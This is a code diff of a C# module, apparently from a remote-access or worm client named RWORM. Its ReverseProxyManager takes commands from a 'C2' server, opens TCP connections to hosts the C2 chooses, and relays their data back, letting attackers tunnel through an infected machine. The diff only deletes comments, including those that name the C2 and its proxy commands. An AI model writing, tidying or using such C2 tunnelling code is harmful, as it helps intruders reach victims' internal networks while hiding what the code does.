@@ -8,11 +8,11 @@ using System.Threading.Tasks;
 
 namespace RWORM.Client.Modules
 {
-    /// <summary>
-    /// Robust reverse proxy manager for remote port forwarding.
-    /// Manages multiplexed TCP channels with auto-reconnection resilience,
-    /// bounded buffer streams, and clean disposal.
-    /// </summary>
+    
+    
+    
+    
+    
     public class ReverseProxyManager : IDisposable
     {
         private class ProxyChannel : IDisposable
@@ -84,15 +84,15 @@ namespace RWORM.Client.Modules
 
             switch (opcode)
             {
-                case 0x90: // PROXY_START: connect to target host:port
+                case 0x90: 
                     HandleStart(channelId, payload);
                     break;
 
-                case 0x91: // PROXY_DATA: data from C2 to forward to target
+                case 0x91: 
                     HandleData(channelId, payload);
                     break;
 
-                case 0x92: // PROXY_STOP: close channel
+                case 0x92: 
                     CloseChannel(channelId, notifyRemote: false);
                     break;
             }
@@ -109,7 +109,7 @@ namespace RWORM.Client.Modules
                     string host = target.Substring(0, colon).Trim();
                     var channel = new ProxyChannel(channelId, host, port);
 
-                    // If existing channel exists, close it cleanly first
+                    
                     if (_channels.TryRemove(channelId, out var oldChannel))
                     {
                         oldChannel.Dispose();
@@ -166,7 +166,7 @@ namespace RWORM.Client.Modules
             var ct = channel.Cts.Token;
             bool connected = false;
 
-            // Attempt connection with retry resilience (up to 2 fast attempts)
+            
             for (int attempt = 1; attempt <= 2 && !ct.IsCancellationRequested && _active; attempt++)
             {
                 try
@@ -180,7 +180,7 @@ namespace RWORM.Client.Modules
 
                     using (var connectCts = CancellationTokenSource.CreateLinkedTokenSource(ct))
                     {
-                        connectCts.CancelAfter(5000); // 5-second connect timeout
+                        connectCts.CancelAfter(5000); 
                         await tcp.ConnectAsync(channel.TargetHost, channel.TargetPort, connectCts.Token);
                     }
 
@@ -207,7 +207,7 @@ namespace RWORM.Client.Modules
                 return;
             }
 
-            // Notify C2 that the remote connection is active
+            
             try
             {
                 await _sendPacket(0x90, channel.ChannelId, Array.Empty<byte>());
@@ -218,7 +218,7 @@ namespace RWORM.Client.Modules
                 return;
             }
 
-            // Pump data from target back to C2
+            
             byte[] buffer = new byte[8192];
             try
             {
@@ -235,7 +235,7 @@ namespace RWORM.Client.Modules
             }
             catch
             {
-                // Disconnection or socket abort
+                
             }
             finally
             {
